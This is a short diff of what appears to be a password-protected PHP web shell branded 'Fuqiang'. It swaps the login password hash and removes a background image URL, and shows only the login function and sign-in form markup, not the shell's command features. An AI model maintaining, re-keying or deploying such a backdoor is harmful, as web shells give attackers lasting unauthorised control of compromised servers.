@@ -17,7 +17,7 @@
         }
     } else
 session_start();
-$password_hash = "$2a$12$XGQaeh/GLrN4rP.AbmrAPuLwPLtR4l7Xfy5h6OziZ1MVBttE7oqY2";
+$password_hash = "$2a$12$G8dkKbOL4tg03ecU698LuuH/2x/wTDKYWqSTUZKPdWUMBjEmtAbtm";
 
 
 function login_shell()
@@ -238,7 +238,7 @@ input[type="submit"]:active
    <div class="signin"> 
 
     <div class="content"> 
-     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggCjKqYU1fIWHn-hkDV1DjQcLK19Zt0CPk_M_WlewMs3A__-JNs07J9veny7PIVE6ycYly5EWIGZtsCygIY1q3uUDATel6_5CQo07m8WaSNLIrE9XP-N-n3HufbFNFW5ge8mZ5LRXc-Xd2D6fMlkvwqNfmjMCfSZkpLpK7L0BnBbGeLZMI70sAJyHN0lr_/s1254/backgroundshell.png" alt="Fuqiang"> 
+     <img src="" alt="Fuqiang"> 
      <p class="gradient-text">Fuqiang</p>
 
      <div class="form"> 
